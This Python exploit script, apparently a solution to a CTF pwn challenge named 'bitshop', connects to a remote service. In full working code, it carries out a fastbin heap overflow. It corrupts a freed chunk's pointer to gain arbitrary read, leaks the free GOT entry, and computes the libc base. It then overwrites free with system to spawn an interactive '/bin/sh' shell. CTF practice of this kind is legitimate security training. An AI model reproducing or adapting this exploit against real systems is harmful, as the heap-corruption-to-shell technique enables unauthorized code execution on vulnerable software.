# coding:utf-8

# fastbin堆溢出

from zio import *
from pwn import *

io = zio(('101.200.187.112',9002), timeout=99999, 
#io = zio('./bitshop', timeout = 9999, 
        print_read = COLORED(RAW, 'green'), print_write = COLORED(RAW,'blue'))
e = elf.ELF('./bitshop')

def add(length, name, msg):
	io.read_until('$')
	io.writeline('1')
	io.read_until('length:')
	io.writeline(str(length))
	io.read_until('comment:')
	io.writeline(msg)
	io.read_until('name:')
	io.writeline(name)

def view():
	io.read_until('$')
	io.writeline('5')

def edit(id,length, msg):
	io.read_until('$')
	io.writeline('2')
	io.read_until(':')
	io.writeline(str(id))
	io.read_until(':')
	io.writeline(str(length))
	io.read_until(':')
	io.writeline(msg)

def delete(id):
	io.read_until('$')
	io.writeline('3')
	io.read_until(':')
	io.writeline(str(id))

def input_note(note):
	io.read_until('$')
	io.writeline('4')
	io.read_until(':')
	io.writeline(note)

# name .bss 0x006020E0
name_addr = 0x006020E0
io.read_until('name:')
io.writeline(p64(0x51))

io.gdb_hint(breakpoints = [0x0000401072])

add(0x48, '\xFF'*8, 'A'*8)		
# comment = malloc(0x48) ptr = malloc(0x48) 分配两块

delete(0)								
# free(comment) free(ptr) 置入fastbin
# 此时fastbin  ptr-> comment  

input_note('A'*(0x64) + p64(0x51) + p64(name_addr - 8 ) )
# 溢出note, 使ptr的fd变为free@got

add(0x48, '\xFF'*8, '/bin/sh')
# 分配ptr块给新comment 和comment块给新ptr

new_input_note_addr = 0x602130
add(0x48, '\xFF'*8, 'A'*0x18 + p64(new_input_note_addr))
# 分配fake块给新comment 和新块给新ptr
# 使用name_addr 覆盖count_note指针

def __leak(addr):
	# 此时input_note写入new_input_note_addr + 4
	# read写入可随意构造payload 
	input_note(p64(addr) + p32(0x16) + p64(new_input_note_addr + 4))

	# 将ptr[0]改写为 new_input_note_addr + 4
	# 此时view comment的值即是 free@got的值
	view()
	io.read_until('Comment : ')
	buf = io.read_until('\n')
	print '[*]leak: ',  hex(addr), '=>', buf[:6]
	return buf+'\x00'
def leak(addr):
	return __leak(addr)[:4]

buf = __leak(e.got['free'])
free_addr = u64(buf[:6].ljust(8,'\x00'))
print '[*] free address:', hex(free_addr)

#buf = __leak(e.got['atoi'])
#atoi_addr = u64(buf[:6].ljust(8,'\x00'))
#print '[*] atoi address:', hex(atoi_addr)

# leak not work! why?
#d = DynELF(leak, elf=e)
#sys_addr = d.lookup('system', 'libc')
#print '[*] system_address', hex(sys_addr)

# remote offset.
offset_free = 0x0000000000082df0
offset_system = 0x0000000000046640

libc_base = free_addr - offset_free
sys_addr = libc_base + offset_system

print '[*] system_address', hex(sys_addr)
# free置为system地址
edit(0, 0x16, p64(sys_addr))
# comment置为/bin/sh
add(0x100, '\xFF'*8, '/bin/sh')
# free comment 即system('/bin/sh')
delete(1)

io.read_until_timeout()
io.interact()


